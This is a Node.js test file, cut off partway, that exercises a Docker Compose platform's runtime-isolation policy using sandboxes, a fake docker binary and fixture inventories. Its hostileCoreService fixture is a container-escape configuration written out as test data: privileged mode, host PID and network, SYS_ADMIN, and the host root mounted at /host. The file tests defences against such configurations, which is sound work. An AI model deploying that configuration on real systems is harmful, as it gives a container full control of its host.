#!/usr/bin/env node
import assert from "node:assert/strict";
import crypto from "node:crypto";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { evaluateRuntimeIsolation } from "./runtime-isolation-policy.mjs";
import {
  coreSemanticPolicyDescriptor,
  evaluateCurrentNoHostedExactAuthority,
  LOCAL_PRIVATE_BASE_SECRET_AUTHORITY,
  LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY,
  localPrivateCoreSemanticPolicySha256,
  validateNoHostedCoreAuthority,
} from "./no-hosted-core-policy.mjs";

const source = fs.readFileSync(path.join(import.meta.dirname, "infra-ops.mjs"), "utf8");
const start = source.indexOf("async function runtimeIsolationCheck()");
const end = source.indexOf("\nasync function faultInjectionTests()", start);

assert.notEqual(start, -1, "runtimeIsolationCheck() is missing");
assert.notEqual(end, -1, "runtimeIsolationCheck() boundary is missing");

const runtimeIsolationConsumer = source.slice(start, end);
const composeVpsSource = fs.readFileSync(path.join(import.meta.dirname, "compose-vps.sh"), "utf8");
const repositoryRoot = path.resolve(import.meta.dirname, "..");
const canonicalNoHostedLockPath = path.join(repositoryRoot, "config", "no-hosted-workloads.lock.json");
const canonicalLocalPrivateNoHostedLockPath = path.join(
  repositoryRoot,
  "config",
  "no-hosted-workloads.local-private.lock.json",
);
let fixtureRootDirectory = repositoryRoot;
const protectedKinds = ["configs", "networks", "secrets", "services", "volumes"];
const requiredCoreEnvironmentLines = [
  "ALERT_EMAIL_TO=qa@fixture.invalid",
  "DOCKER_ACTION_ACTIVATION_INBOX=/srv/platform/provider-activation/inbox",
  "DOCKER_ACTION_ACTIVE_RECEIPT_FILE=/srv/platform/trust/active-receipt.json",
  `DOCKER_ACTION_ACTIVE_RECEIPT_SHA256=${"a".repeat(64)}`,
  `DOCKER_ACTION_COMBINED_RENDER_SHA256=${"b".repeat(64)}`,
  "DOCKER_ACTION_RUNTIME_INTENT_FILE=/srv/platform/trust/runtime-intent.json",
  "DOCKER_ACTION_RUNTIME_INTENT_ID=intent.offline-compose-v2",
  "MAILER_FROM=qa@fixture.invalid",
  "MAILER_REPLY_TO=qa@fixture.invalid",
  "PHP_PROJECTS_DIR=../src",
  "PLATFORM_BACKUP_SCHEDULER_IMAGE_REPOSITORY=registry.example.invalid/platform/backup-scheduler",
  `PLATFORM_BACKUP_SCHEDULER_IMAGE_SHA256=${"e".repeat(64)}`,
  "PLATFORM_DOCKER_ACTION_BROKER_IMAGE_REPOSITORY=registry.example.invalid/platform/docker-action-broker",
  `PLATFORM_DOCKER_ACTION_BROKER_IMAGE_SHA256=${"c".repeat(64)}`,
  `PLATFORM_OPS_IMAGE=registry.example.invalid/platform/ops@sha256:${"f".repeat(64)}`,
  "PLATFORM_PROVIDER_ACTIVATION_SIDECAR_IMAGE_REPOSITORY=registry.example.invalid/platform/provider-activation",
  `PLATFORM_PROVIDER_ACTIVATION_SIDECAR_IMAGE_SHA256=${"d".repeat(64)}`,
  "SMTP_HOST=smtp.fixture.invalid",
  "SMTP_USER=qa",
];
const expectedCoreInventory = {
  configs: ["enterprise_traefik_routes"],
  networks: [
    "platform_bus",
    "platform_cache",
    "platform_db_admin",
    "platform_edge",
    "platform_egress",
    "platform_observability",
    "platform_postgres",
    "platform_routing",
    "platform_storage",
  ],
  secrets: [
    "alertmanager_webhook_token",
    "control_center_database_url",
    "control_center_vault_keys",
    "docker_action_backup_catalog",
    "docker_action_backup_job_execute",
    "docker_action_backup_offsite_sync",
    "docker_action_backup_prune_apply",
    "docker_action_backup_prune_plan",
    "docker_action_evidence_runtime_snapshot",
    "docker_action_restore_drill_full",
    "docker_action_runtime_intent_trust_key",
    "grafana_admin_password",
    "keycloak_admin_password",
    "keycloak_db_password",
    "mariadb_root_password",
    "minio_root_password",
    "nats_password",
    "postgres_superuser_password",
    "projects_gateway_signing_keys",
    "redis_password",
    "smtp_password",
  ],
  services: [
    "alertmanager",
    "backup-scheduler",
    "broker-auth-bootstrap",
    "control-center",
    "docker-action-activation-sidecar",
    "docker-action-broker",
    "grafana",
    "keycloak",
    "loki",
    "mariadb",
    "minio",
    "nats",
    "platform-alert-dispatcher",
    "postgres",
    "project-router",
    "prometheus",
    "promtail",
    "redis",
    "traefik",
    "waf",
  ],
  volumes: [
    "backup_scheduler_jobs",
    "backup_scheduler_logs",
    "docker_action_activation_cas",
    "docker_action_broker_socket",
    "docker_action_broker_state",
    "enterprise_alertmanager_data",
    "enterprise_grafana_data",
    "enterprise_keycloak_data",
    "enterprise_loki_data",
    "enterprise_mariadb_data",
    "enterprise_minio_data",
    "enterprise_nats_data",
    "enterprise_postgres_data",
    "enterprise_prometheus_data",
    "enterprise_redis_data",
    "nats_auth_config",
    "redis_auth_config",
  ],
};

function sha256(value) {
  return crypto.createHash("sha256").update(value).digest("hex");
}

function cleanEnvironment(overrides = {}) {
  const environment = { ...process.env };
  for (const key of [
    "COMPOSE_ENV_FILE",
    "COMPOSE_PROJECT_NAME",
    "DOCKER_CONTEXT",
    "DOCKER_HOST",
    "HOSTED_WORKLOAD_ALLOW_RESOLVED",
    "HOSTED_WORKLOAD_LOCK",
    "HOSTED_WORKLOAD_MODE",
    "HOSTED_WORKLOAD_PREPARE_RESOLVED",
    "HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE",
    "HOSTED_TEST_INFRASTRUCTURE_ROOT",
    "PLATFORM_TRUSTED_RELEASE_CONTEXT",
    "PLATFORM_COMPOSE_VARIANT",
    "PLATFORM_V1_LOCAL_PRIVATE_RENDER",
    "PLATFORM_RUNTIME_CANDIDATE_ID",
    "PLATFORM_RUNTIME_COMMIT",
    "PLATFORM_RUNTIME_DEPLOYMENT_ID",
    "PLATFORM_RUNTIME_SOURCE_RENDER_SHA256",
    "PLATFORM_RUNTIME_TREE",
    "PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256",
    "QA6_ACTIVATION_BUNDLE_FILE",
    "QA6_DOCKER_ENV_CAPTURE",
    "QA6_DOCKER_MARKER",
    "QA6_DOCKER_OUTPUT_FILE",
    "QA6_SWAP_ENV_REPLACEMENT",
    "QA6_SWAP_ENV_TARGET",
    "QA6_SWAP_LOCK_REPLACEMENT",
    "QA6_SWAP_LOCK_TARGET",
  ]) {
    delete environment[key];
  }
  return { ...environment, ...overrides };
}

function writeExecutable(filePath, body) {
  fs.writeFileSync(filePath, body, { mode: 0o755 });
}

function copyRepositoryFile(root, relativePath) {
  const target = path.join(root, relativePath);
  fs.mkdirSync(path.dirname(target), { recursive: true });
  fs.copyFileSync(path.join(repositoryRoot, relativePath), target);
  return target;
}

function copyRepositoryImportClosure(root, entryRelativePath, visited = new Set()) {
  const normalizedEntry = entryRelativePath.split(path.sep).join("/");
  if (visited.has(normalizedEntry)) return;
  visited.add(normalizedEntry);
  const sourcePath = path.join(repositoryRoot, normalizedEntry);
  copyRepositoryFile(root, normalizedEntry);
  if (!/\.(?:mjs|js)$/.test(normalizedEntry)) return;
  const sourceText = fs.readFileSync(sourcePath, "utf8");
  const importPattern = /(?:\bfrom\s*|\bimport\s*)["'](\.\.?\/[^"']+)["']/g;
  for (const match of sourceText.matchAll(importPattern)) {
    const importedPath = path.resolve(path.dirname(sourcePath), match[1]);
    const relativeImportedPath = path.relative(repositoryRoot, importedPath);
    if (relativeImportedPath.startsWith(`..${path.sep}`) || path.isAbsolute(relativeImportedPath)) {
      throw new Error(`repository import escaped fixture root: ${match[1]}`);
    }
    copyRepositoryImportClosure(root, relativeImportedPath, visited);
  }
}

function createConsumerSandbox({
  v1LocalPrivateAuthority = false,
  v1ReleaseId = `${"1".repeat(40)}-${"2".repeat(64)}`,
} = {}) {
  const cleanupRoot =
    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "runtime-consumer-qa6-")));
  const v1InfrastructureRoot = path.join(cleanupRoot, "v1-authority");
  const root = v1LocalPrivateAuthority
    ? path.join(v1InfrastructureRoot, "releases", v1ReleaseId)
    : path.join(cleanupRoot, "platform-infrastructure");
  fs.mkdirSync(root, { recursive: true });
  fs.mkdirSync(path.join(cleanupRoot, "src"));
  fs.mkdirSync(path.join(cleanupRoot, "applications", "example-app"), { recursive: true });
  fixtureRootDirectory = root;
  const scripts = path.join(root, "scripts");
  const configDirectory = path.join(root, "config");
  const fakeBin = path.join(root, "bin");
  fs.mkdirSync(scripts, { recursive: true });
  fs.mkdirSync(configDirectory, { recursive: true });
  fs.mkdirSync(fakeBin, { recursive: true });
  const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
  if (v1LocalPrivateAuthority && process.platform === "linux") {
    const wrapperSource = fs.readFileSync(composeVps, "utf8");
    const hostProbe = "HOST_OS=$(trusted_host_os)";
    assert.equal(wrapperSource.split(hostProbe).length - 1, 1, "V1 fixture requires one exact host OS probe");
    fs.writeFileSync(composeVps, wrapperSource.replace(hostProbe, "HOST_OS=Darwin"));
  }
  fs.chmodSync(composeVps, 0o755);
  copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
  copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
  const canonicalLock = copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
  const localPrivateCanonicalLock = copyRepositoryFile(
    root,
    "config/no-hosted-workloads.local-private.lock.json",
  );
  const inventory = structuredClone(expectedCoreInventory);
  const trustedEnvironmentBytes = [
    "HOSTED_WORKLOAD_LOCK=",
    "HOSTED_WORKLOAD_MODE=no-hosted",
    ...(v1LocalPrivateAuthority ? ["PLATFORM_COMPOSE_VARIANT=LOCAL_PRIVATE"] : []),
    "CORE_VALUE=trusted",
    "DOMAIN=fixture.invalid",
    ...requiredCoreEnvironmentLines,
    "",
  ].join("\n");
  const environmentFile = v1LocalPrivateAuthority
    ? path.join(v1InfrastructureRoot, "v1", "local-private", "exact-compose.env")
    : path.join(root, ".env");
  fs.mkdirSync(path.dirname(environmentFile), { recursive: true, mode: 0o700 });
  fs.writeFileSync(environmentFile, trustedEnvironmentBytes, { mode: v1LocalPrivateAuthority ? 0o400 : 0o600 });
  fs.chmodSync(environmentFile, v1LocalPrivateAuthority ? 0o400 : 0o600);
  fs.writeFileSync(path.join(root, ".env.vps.example"), trustedEnvironmentBytes, { mode: 0o600 });
  const workloadLock = path.join(root, "hosted.lock.json");
  fs.writeFileSync(workloadLock, "{}\n", { mode: 0o600 });
  const activationBundleFile = path.join(root, "activation-bundle.json");
  const dockerOutputFile = path.join(root, "docker-output.json");
  const dockerMarker = path.join(root, "docker-called");
  const dockerArgumentsCapture = path.join(root, "docker-args.txt");
  const dockerEnvironmentCapture = path.join(root, "docker-env.txt");
  const dockerProcessEnvironmentCapture = path.join(root, "docker-process-env.txt");
  if (v1LocalPrivateAuthority) {
    for (const pathname of [dockerOutputFile, dockerMarker, dockerArgumentsCapture, dockerEnvironmentCapture, dockerProcessEnvironmentCapture]) {
      fs.writeFileSync(pathname, pathname === dockerMarker ? "not-called\n" : "", { mode: 0o600 });
    }
  }
  writeExecutable(path.join(fakeBin, "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
if [ -f "$sandbox_root/swap-lock-replacement" ]; then
  /bin/mv "$sandbox_root/swap-lock-replacement" "$sandbox_root/config/no-hosted-workloads.lock.json"
  : > "$sandbox_root/lock-swap-fired"
fi
if [ -f "$sandbox_root/swap-env-trigger" ] && [ -f "$sandbox_root/swap-env-replacement" ]; then
  /bin/rm "$sandbox_root/swap-env-trigger"
  /bin/mv "$sandbox_root/swap-env-replacement" "$sandbox_root/.env"
  : > "$sandbox_root/env-swap-fired"
fi
: > "$sandbox_root/docker-called"
printf '%s\n' "$*" > "$sandbox_root/docker-args.txt"
/usr/bin/env | /usr/bin/sort > "$sandbox_root/docker-process-env.txt"
expect_env=0
for argument in "$@"; do
  if [ "$expect_env" = 1 ]; then
    /bin/cat "$argument" > "$sandbox_root/docker-env.txt"
    expect_env=0
  elif [ "$argument" = "--env-file" ]; then
    expect_env=1
  fi
done
/bin/cat "$sandbox_root/docker-output.json"
`);
  writeExecutable(path.join(scripts, "hosted-workload-lock.sh"), `#!/bin/sh
set -eu
case "\${2:-}" in
  activation-bundle) /bin/cat "$QA6_ACTIVATION_BUNDLE_FILE" ;;
  verify) exit 0 ;;
  *) exit 64 ;;
esac
`);
  const environment = cleanEnvironment({
    PATH: `${fakeBin}:${process.env.PATH}`,
    COMPOSE_ENV_FILE: environmentFile,
    COMPOSE_PROJECT_NAME: "platform_infra_vps",
    HOSTED_WORKLOAD_LOCK: "",
    HOSTED_WORKLOAD_MODE: "no-hosted",
    HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: "",
    QA6_ACTIVATION_BUNDLE_FILE: activationBundleFile,
    ...(v1LocalPrivateAuthority ? {
      HOSTED_TEST_INFRASTRUCTURE_ROOT: v1InfrastructureRoot,
      PLATFORM_COMPOSE_VARIANT: "LOCAL_PRIVATE",
      PLATFORM_V1_LOCAL_PRIVATE_RENDER: "1",
    } : {}),
  });
  if (v1LocalPrivateAuthority) fs.chmodSync(root, 0o555);
  return {
    cleanupRoot,
    root,
    scripts,
    composeVps,
    canonicalLock,
    localPrivateCanonicalLock,
    inventory,
    environmentFile,
    workloadLock,
    activationBundleFile,
    dockerOutputFile,
    dockerMarker,
    dockerArgumentsCapture,
    dockerEnvironmentCapture,
    dockerProcessEnvironmentCapture,
    environment,
    v1InfrastructureRoot,
    v1LocalPrivateAuthority,
  };
}

function addInfraConsumer(sandbox) {
  copyRepositoryImportClosure(sandbox.root, "scripts/infra-ops.mjs");
  fs.cpSync(
    path.join(repositoryRoot, "vendor", "json-schema"),
    path.join(sandbox.root, "vendor", "json-schema"),
    { recursive: true },
  );
  sandbox.infraOps = path.join(sandbox.scripts, "infra-ops.mjs");
  return sandbox;
}

function removeSandbox(sandbox) {
  if (sandbox.v1LocalPrivateAuthority && fs.existsSync(sandbox.root)) fs.chmodSync(sandbox.root, 0o700);
  fs.rmSync(sandbox.cleanupRoot ?? sandbox.root, { recursive: true, force: true });
}

function freezeReleaseTree(root) {
  const visit = (current) => {
    const metadata = fs.lstatSync(current);
    if (metadata.isDirectory()) {
      for (const name of fs.readdirSync(current)) visit(path.join(current, name));
      fs.chmodSync(current, 0o555);
      return;
    }
    assert.equal(metadata.isFile(), true, `release fixture contains non-regular entry: ${current}`);
    fs.chmodSync(current, (metadata.mode & 0o111) === 0 ? 0o444 : 0o555);
  };
  visit(root);
}

function thawReleaseTree(root) {
  const visit = (current) => {
    const metadata = fs.lstatSync(current);
    if (!metadata.isDirectory()) return;
    fs.chmodSync(current, 0o700);
    for (const name of fs.readdirSync(current)) visit(path.join(current, name));
  };
  if (fs.existsSync(root)) visit(root);
}

function runWrapper(sandbox, arguments_ = ["runtime-isolation-envelope"], overrides = {}) {
  return spawnSync("/bin/bash", [sandbox.composeVps, ...arguments_], {
    encoding: "utf8",
    env: cleanEnvironment({ ...sandbox.environment, ...overrides }),
  });
}

function runInfraConsumer(sandbox, extraArguments = []) {
  return runInfraArguments(sandbox, [
    "--env-file",
    sandbox.environmentFile,
    ...extraArguments,
  ]);
}

function runInfraArguments(sandbox, arguments_) {
  return spawnSync(process.execPath, [
    "--",
    sandbox.infraOps,
    "runtime-isolation-check",
    ...arguments_,
  ], {
    encoding: "utf8",
    env: cleanEnvironment(sandbox.environment),
  });
}

function boundedService(overrides = {}) {
  return {
    cpus: 0.5,
    cpu_shares: 256,
    mem_limit: 128 * 1024 * 1024,
    memswap_limit: 128 * 1024 * 1024,
    mem_reservation: 32 * 1024 * 1024,
    pids_limit: 128,
    ulimits: { nofile: { soft: 8192, hard: 8192 } },
    blkio_config: { weight: 300 },
    restart: "no",
    healthcheck: { test: ["CMD", "true"] },
    logging: { driver: "json-file", options: { "max-size": "10m", "max-file": "5" } },
    environment: {},
    secrets: [],
    volumes: [],
    networks: {},
    read_only: true,
    security_opt: ["no-new-privileges:true"],
    ...overrides,
  };
}

function coreRuntimeConfig(inventory, { hosted = false } = {}) {
  const fromNames = (names, definition) =>
    Object.fromEntries(names.map((name) => [name, definition(name)]));
  const physicalNetworkName = (name) => {
    if (name === "enterprise_net") return "enterprise_net";
    if (name === "platform_docker_control") return "platform_infra_vps_platform_docker_control";
    return `platform_infra_vps_${name.slice("platform_".length)}`;
  };
  const config = {
    name: "platform_infra_vps",
    configs: fromNames(inventory.configs, (name) => ({
      content: coreSemanticPolicyDescriptor.configContentLines[name]
        .join("\n")
        .replace("__PORTAL_HOST__", "portal.fixture.invalid")
        .replace("__DOCS_HOST__", "docs.fixture.invalid")
        .replace("__AUTH_HOST__", "auth.fixture.invalid"),
    })),
    networks: fromNames(inventory.networks, (name) => ({
      name: coreSemanticPolicyDescriptor.physicalNetworkNames[name],
      ...(Object.keys(coreSemanticPolicyDescriptor.networkLabels[name]).length > 0
        ? { labels: structuredClone(coreSemanticPolicyDescriptor.networkLabels[name]) }
        : {}),
      ...(name === "enterprise_net" ? { external: true } : {}),
      ...(name !== "enterprise_net" && name !== "platform_egress" ? { internal: true } : {}),
      ...(name === "platform_egress" ? { enable_ipv6: false } : {}),
      ...(name === "platform_docker_control" ? { driver: "bridge" } : {}),
    })),
    secrets: fromNames(inventory.secrets, (name) => ({
      file: path.join(fixtureRootDirectory, coreSemanticPolicyDescriptor.secretFiles[name]),
    })),
    services: fromNames(inventory.services, () => boundedService()),
    volumes: fromNames(inventory.volumes, (name) => ({
      name: coreSemanticPolicyDescriptor.physicalVolumeNames[name],
      ...(coreSemanticPolicyDescriptor.externalVolumeNames.includes(name) ? { external: true } : {}),
    })),
  };
  config.services["control-center"] = boundedService({ read_only: true, cpu_shares: 1024 });
  config.services["project-router"] = boundedService({
    volumes: [
      { type: "bind", source: "/srv/apps", target: "/var/www/projects", read_only: true },
      { type: "bind", source: "/srv/state", target: "/var/www/project-state", read_only: true },
    ],
  });
  config.services["platform-alert-dispatcher"] = boundedService();
  config.services["backup-scheduler"] = boundedService({
    cpu_shares: 1024,
    environment: {
      DOCKER_HOST: "tcp://docker-socket-proxy:2375",
      DOCKER_API_VERSION: "1.51",
    },
    networks: { platform_docker_control: null },
  });
  config.services["docker-socket-proxy"] = boundedService({
    cpu_shares: 1024,
    image: `ghcr.io/tecnativa/docker-socket-proxy:v0.4.2@sha256:${"a".repeat(64)}`,
    environment: Object.fromEntries(
      ["AUTH", "BUILD", "COMMIT", "CONFIGS", "SECRETS", "SERVICES", "SESSION", "SWARM", "SYSTEM", "TASKS"]
        .map((key) => [key, "0"]),
    ),
    ports: [{ host_ip: "127.0.0.1", published: "2376", target: 2375, protocol: "tcp" }],
    volumes: [{ type: "bind", source: "/var/run/docker.sock", target: "/var/run/docker.sock", read_only: true }],
    networks: { platform_docker_control: null },
  });
  config.services.postgres = boundedService();
  for (const serviceName of inventory.services) {
    const service = config.services[serviceName];
    const processModel = coreSemanticPolicyDescriptor.serviceProcessModel[serviceName];
    service.container_name = coreSemanticPolicyDescriptor.serviceContainerNames[serviceName];
    service.restart = coreSemanticPolicyDescriptor.serviceRestartPolicies[serviceName];
    if (coreSemanticPolicyDescriptor.serviceProfiles[serviceName]) {
      service.profiles = [...coreSemanticPolicyDescriptor.serviceProfiles[serviceName]];
    }
    if (coreSemanticPolicyDescriptor.exactExceptions.pid[serviceName]) {
      service.pid = coreSemanticPolicyDescriptor.exactExceptions.pid[serviceName];
    }
    if (coreSemanticPolicyDescriptor.exactExceptions.networkMode[serviceName]) {
      service.network_mode =
        coreSemanticPolicyDescriptor.exactExceptions.networkMode[serviceName];
    }
    const dependencies = coreSemanticPolicyDescriptor.serviceDependencies[serviceName] ?? [];
    if (dependencies.length > 0) {
      service.depends_on = Object.fromEntries(
        dependencies.map((dependency) => [
          dependency,
          { condition: "service_healthy", required: true, restart: false },
        ]),
      );
    }
    service.healthcheck =
      structuredClone(coreSemanticPolicyDescriptor.serviceHealthchecks[serviceName]);
    if (!coreSemanticPolicyDescriptor.servicesWithDefaultLogging.includes(serviceName)) {
      delete service.logging;
    }
    if (processModel.command !== null) service.command = structuredClone(processModel.command);
    if (processModel.entrypoint !== null) service.entrypoint = structuredClone(processModel.entrypoint);
    service.networks = Object.fromEntries(
      coreSemanticPolicyDescriptor.serviceNetworks[serviceName].map((name) => [name, null]),
    );
    service.secrets = [...(coreSemanticPolicyDescriptor.serviceSecretGrants[serviceName] ?? [])];
    service.configs = structuredClone(coreSemanticPolicyDescriptor.serviceConfigGrants[serviceName] ?? []);
    service.ports = (coreSemanticPolicyDescriptor.servicePortRules[serviceName] ?? []).map((port) => ({
      host_ip: port.hostIp,
      protocol: port.protocol,
      published: String(port.published),
      target: port.target,
    }));
    if (coreSemanticPolicyDescriptor.tmpfsRules[serviceName]) {
      service.tmpfs = [...coreSemanticPolicyDescriptor.tmpfsRules[serviceName]];
    }
    if (serviceName === "alertmanager") service.group_add = ["1000"];
    if (coreSemanticPolicyDescriptor.requiredServiceControls.capDropAll.includes(serviceName)) {
      service.cap_drop = ["ALL"];
    }
    if (coreSemanticPolicyDescriptor.requiredServiceControls.numericUsers[serviceName]) {
      service.user = coreSemanticPolicyDescriptor.requiredServiceControls.numericUsers[serviceName];
    }
    service.image = coreSemanticPolicyDescriptor.serviceImages[serviceName];
    const dockerfile = coreSemanticPolicyDescriptor.buildDockerfiles[serviceName];
    if (dockerfile) {
      service.build = {
        context: fixtureRootDirectory,
        dockerfile,
        args: { NODE_IMAGE: coreSemanticPolicyDescriptor.serviceImages["project-router"] },
      };
    }
    if (serviceName === "docker-socket-proxy") {
      service.environment = structuredClone(coreSemanticPolicyDescriptor.proxyEnvironment);
    }
    if (serviceName === "control-center") {
      Object.assign(
        service.environment,
        structuredClone(coreSemanticPolicyDescriptor.controlCenterFixedSecurityEnvironment),
        { CONTROL_CENTER_OIDC_ISSUER: "https://auth.fixture.invalid/realms/platform" },
      );
    }
    if (serviceName === "waf") {
      service.environment = {
        ...service.environment,
        ...structuredClone(coreSemanticPolicyDescriptor.wafFixedSecurityEnvironment),
        ...Object.fromEntries(
          Object.entries(coreSemanticPolicyDescriptor.wafProjectedSecurityEnvironment)
            .map(([key, projection]) => [key, projection.fallback]),
        ),
      };
    }
    if (serviceName === "backup-scheduler") {
      Object.assign(
        service.environment,
        Object.fromEntries(
          Object.entries(coreSemanticPolicyDescriptor.backupSchedulerBooleanEnvironment)
            .map(([key, projection]) => [key, projection.fallback]),
        ),
      );
    }
    service.volumes = [];
    for (const [target, mode] of Object.entries(
      coreSemanticPolicyDescriptor.bindTargets[serviceName] ?? {},
    )) {
      const [rule] = coreSemanticPolicyDescriptor.bindSourceRules[serviceName][target];
      const source = rule.startsWith("root:")
        ? path.resolve(fixtureRootDirectory, rule.slice("root:".length))
        : path.resolve(fixtureRootDirectory, "../src");
      service.volumes.push({
        type: "bind",
        source,
        target,
        read_only: mode === "read-only",
      });
    }
    for (const [candidateService, source, target, mode] of
      coreSemanticPolicyDescriptor.hostBindExceptions) {
      if (candidateService === serviceName) {
        service.volumes.push({
          type: "bind",
          source,
          target,
          read_only: mode === "read-only",
        });
      }
    }
    for (const [source, target] of Object.entries(
      coreSemanticPolicyDescriptor.namedVolumeTargets[serviceName] ?? {},
    )) {
      service.volumes.push({ type: "volume", source, target });
    }
  }
  const authoritativeConfig = coreTestGoldenConfig(inventory);
  for (const key of coreSemanticPolicyDescriptor.exactAuthorityShape.topLevelFields) {
    config[key] = authoritativeConfig[key];
  }
  if (hosted) {
    config.services["example-app-web"] = boundedService({
      image: `example.invalid/example-app@sha256:${"a".repeat(64)}`,
      user: "1000:1000",
      init: true,
      logging: { driver: "local", options: { "max-size": "10m", "max-file": "3" } },
      security_opt: ["no-new-privileges:true"],
      cap_drop: ["ALL"],
      labels: {
        "com.platform.workload-id": "example-app",
        "com.platform.workload-role": "web",
      },
      networks: { example_app_ingress: null },
    });
    config.networks.example_app_ingress = {
      internal: true,
      name: "platform_infra_vps_example_app_ingress",
    };
  }
  return config;
}

function hostileCoreService(overrides = {}) {
  return boundedService({
    image: `attacker.invalid/hostile@sha256:${"f".repeat(64)}`,
    privileged: true,
    pid: "host",
    network_mode: "host",
    cap_add: ["SYS_ADMIN"],
    devices: ["/dev/null:/dev/qa7"],
    volumes: [{ type: "bind", source: "/", target: "/host" }],
    ...overrides,
  });
}

function coreAuthorityConfig() {
  const config = coreRuntimeConfig(expectedCoreInventory);
  for (const [serviceName, definition] of Object.entries(config.services)) {
    definition.image ||= `trusted.invalid/${serviceName}@sha256:${sha256(serviceName)}`;
  }
  return config;
}

function writeDockerOutput(sandbox, documents) {
  fs.writeFileSync(sandbox.dockerOutputFile, documents);
}

const qa8GoldenParserPath = path.join(
  import.meta.dirname,
  "fixtures",
  "hosted-golden-parser.rb",
);
let qa8RepositoryGoldenTemplate;
let gitArchiveBufferTemplate;
let gitArchiveEntryTemplate;

function gitArchiveBytes() {
  if (gitArchiveBufferTemplate !== undefined) return gitArchiveBufferTemplate;
  const archive = spawnSync(
    "git",
    ["-C", repositoryRoot, "archive", "--format=tar", "HEAD"],
    { encoding: null, maxBuffer: 64 * 1024 * 1024 },
  );
  assert.equal(
    archive.status,
    0,
    `git archive failed: ${archive.stderr?.toString("utf8") ?? ""}`,
  );
  gitArchiveBufferTemplate = archive.stdout;
  return gitArchiveBufferTemplate;
}

function gitArchiveEntries() {
  if (gitArchiveEntryTemplate !== undefined) return [...gitArchiveEntryTemplate];
  const listing = spawnSync("/usr/bin/tar", ["-tf", "-"], {
    encoding: "utf8",
    input: gitArchiveBytes(),
    maxBuffer: 8 * 1024 * 1024,
  });
  assert.equal(listing.status, 0, `git archive listing failed: ${listing.stderr}`);
  gitArchiveEntryTemplate = listing.stdout.trimEnd().split("\n");
  return [...gitArchiveEntryTemplate];
}

function pinnedComposeRendererOrSkip(t) {
  const binary = String(process.env.PLATFORM_TEST_DOCKER_COMPOSE_BIN || "");
  const expectedSha256 = String(process.env.PLATFORM_TEST_DOCKER_COMPOSE_SHA256 || "");
  if (!binary && !expectedSha256) {
    t.skip("NOT_RUN: SHA-pinned standalone Compose renderer is unavailable");
    return null;
  }
  assert.equal(path.isAbsolute(binary), true, "Compose renderer path must be absolute");
  assert.match(expectedSha256, /^[a-f0-9]{64}$/);
  const metadata = fs.lstatSync(binary);
  assert.equal(metadata.isFile() && !metadata.isSymbolicLink(), true);
  assert.equal(metadata.nlink, 1, "Compose renderer must have one filesystem link");
  assert.equal(
    crypto.createHash("sha256").update(fs.readFileSync(binary)).digest("hex"),
    expectedSha256,
    "Compose renderer SHA-256 drifted",
  );
  const version = spawnSync(binary, ["version", "--short"], {
    encoding: "utf8",
    env: {
      DOCKER_HOST: `unix://${path.join(os.tmpdir(), "v1-archive-render-engine-must-not-exist.sock")}`,
      HOME: os.tmpdir(),
      LANG: "C",
      LC_ALL: "C",
      PATH: process.env.PATH,
    },
    timeout: 30_000,
  });
  assert.equal(version.status, 0, version.stderr);
  assert.equal(version.stdout.trim(), "5.3.1");
  return binary;
}

function qa8EnvironmentObject(sandbox) {
  return {
    COMPOSE_PROJECT_NAME: "platform_infra_vps",
    DOMAIN: "fixture.invalid",
    DOCKER_ACTION_ACTIVATION_INBOX: "/srv/platform/provider-activation/inbox",
    DOCKER_ACTION_ACTIVE_RECEIPT_FILE: "/srv/platform/trust/active-receipt.json",
    DOCKER_ACTION_ACTIVE_RECEIPT_SHA256: "a".repeat(64),
    DOCKER_ACTION_COMBINED_RENDER_SHA256: "b".repeat(64),
    DOCKER_ACTION_RUNTIME_INTENT_FILE: "/srv/platform/trust/runtime-intent.json",
    DOCKER_ACTION_RUNTIME_INTENT_ID: "intent.offline-compose-v2",
    PHP_PROJECTS_DIR: "../compose-source",
    PLATFORM_BACKUP_SCHEDULER_IMAGE_REPOSITORY: "registry.example.invalid/platform/backup-scheduler",
    PLATFORM_BACKUP_SCHEDULER_IMAGE_SHA256: "e".repeat(64),
    PLATFORM_DOCKER_ACTION_BROKER_IMAGE_REPOSITORY: "registry.example.invalid/platform/docker-action-broker",
    PLATFORM_DOCKER_ACTION_BROKER_IMAGE_SHA256: "c".repeat(64),
    PLATFORM_OPS_IMAGE: `registry.example.invalid/platform/ops@sha256:${"f".repeat(64)}`,
    PLATFORM_PROVIDER_ACTIVATION_SIDECAR_IMAGE_REPOSITORY: "registry.example.invalid/platform/provider-activation",
    PLATFORM_PROVIDER_ACTIVATION_SIDECAR_IMAGE_SHA256: "d".repeat(64),
    PROJECT_SOURCE_DIR: "../compose-source",
    HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: sandbox.canonicalLock,
    ALERT_EMAIL_TO: "qa@fixture.invalid",
    MAILER_FROM: "qa@fixture.invalid",
    MAILER_REPLY_TO: "qa@fixture.invalid",
    SMTP_HOST: "smtp.fixture.invalid",
    SMTP_USER: "qa",
  };
}

function qa8EnvironmentMap(sandbox) {
  return new Map(Object.entries(qa8EnvironmentObject(sandbox)));
}

function installQa8Environment(sandbox) {
  const values = qa8EnvironmentObject(sandbox);
  const bytes = [
    "HOSTED_WORKLOAD_LOCK=",
    "HOSTED_WORKLOAD_MODE=no-hosted",
    ...Object.entries(values).map(([key, value]) => `${key}=${value}`),
    "",
  ].join("\n");
  fs.mkdirSync(path.join(sandbox.cleanupRoot, "compose-source"), { recursive: true });
  fs.writeFileSync(sandbox.environmentFile, bytes, { mode: 0o600 });
  fs.writeFileSync(path.join(sandbox.root, ".env.vps.example"), bytes, { mode: 0o600 });
  Object.assign(sandbox.environment, {
    COMPOSE_PROJECT_NAME: values.COMPOSE_PROJECT_NAME,
    HOSTED_WORKLOAD_LOCK: "",
    HOSTED_WORKLOAD_MODE: "no-hosted",
